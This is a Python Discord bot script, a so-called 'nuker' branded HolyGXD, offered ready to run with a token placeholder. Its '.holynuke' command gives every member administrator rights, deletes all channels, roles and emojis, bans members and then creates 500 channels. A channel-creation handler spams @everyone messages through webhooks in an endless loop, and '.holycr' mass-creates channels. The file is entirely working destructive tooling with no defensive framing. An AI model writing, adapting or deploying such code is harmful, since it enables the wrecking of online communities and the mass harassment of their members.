import discord
from discord.ext import commands
import random
from discord import Permissions
import colorama
from colorama import Fore, Style
import asyncio

holygxd = 'YOUR TOKEN'
holygxdspam = ['@everyone Nuked By HolyGXD Nuker', '@everyone HOLYGXD']
holygxdnames = ['HOLYGXD', 'HolyGXD', 'holygxd']


colorama.init()

client = commands.Bot(command_prefix='.')

@client.event
async def on_ready():
  print(f"""
{Fore.MAGENTA}

 ██░ ██  ▒█████   ██▓   ▓██   ██▓  ▄████ ▒██   ██▒▓█████▄ 
▓██░ ██▒▒██▒  ██▒▓██▒    ▒██  ██▒ ██▒ ▀█▒▒▒ █ █ ▒░▒██▀ ██▌
▒██▀▀██░▒██░  ██▒▒██░     ▒██ ██░▒██░▄▄▄░░░  █   ░░██   █▌
░▓█ ░██ ▒██   ██░▒██░     ░ ▐██▓░░▓█  ██▓ ░ █ █ ▒ ░▓█▄   ▌
░▓█▒░██▓░ ████▓▒░░██████▒ ░ ██▒▓░░▒▓███▀▒▒██▒ ▒██▒░▒████▓ 
 ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░▓  ░  ██▒▒▒  ░▒   ▒ ▒▒ ░ ░▓ ░ ▒▒▓  ▒ 
 ▒ ░▒░ ░  ░ ▒ ▒░ ░ ░ ▒  ░▓██ ░▒░   ░   ░ ░░   ░▒ ░ ░ ▒  ▒ 
 ░  ░░ ░░ ░ ░ ▒    ░ ░   ▒ ▒ ░░  ░ ░   ░  ░    ░   ░ ░  ░ 
 ░  ░  ░    ░ ░      ░  ░░ ░           ░  ░    ░     ░    
                         ░ ░                       ░      
                                                          
  ===========================================
 ~ .holynuke - Will Destroy The Server       ~
 ~ .holycr - Wil Create Channels & Spam      ~
  ===========================================
     
                               Dissiii#0001
                            
""")
{Fore.RESET}

@client.event
async def on_guild_channel_create(channel):
  webhook =await channel.create_webhook(name = random.choice(holygxdnames))
  while True:
    await channel.send(random.choice(holygxdspam))
    await webhook.send(random.choice(holygxdspam), username=random.choice(holygxdnames))

@client.command()
async def holynuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.GREEN + f"[+] {Fore.RESET} Everyone has Admin")
    except:
      print(Fore.RED + f"[—] {Fore.RESET} I Couldn't give everyone admin")
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.GREEN + f"[+] Channel > {Fore.RESET} {channel.name} was deleted.")
      except:
        print(Fore.RED + f"[—] Channel > {Fore.RESET} {channel.name} was not deleted.")
    for member in guild.members:
     try:
       await member.ban()
       print(Fore.GREEN + f"[+] Ban > {Fore.RESET} {member.name}#{member.discriminator} was banned")
     except:
       print(Fore.RED + f"[—] Ban > {Fore.RESET} {member.name}#{member.discriminator} was not banned")
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.GREEN + f"[+] Role > {Fore.RESET} {role.name} was deleted")
     except:
       print(Fore.RED + f"[—] Role > {Fore.RESET} {role.name} was not deleted")
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.GREEN + f"[+] Emoji > {Fore.RESET} {emoji.name} was deleted")
     except:
       print(Fore.RED + f"[—] Emoji > {Fore.RESET} {emoji.name} was not Deleted")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(random.choice(holygxdnames))
    return




@client.command()
async def holycr(ctx):
  await ctx.message.delete()
  guild = ctx.message.guild
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')
  await guild.create_text_channel('HOLYGXD NUKER')


client.run(holygxd)
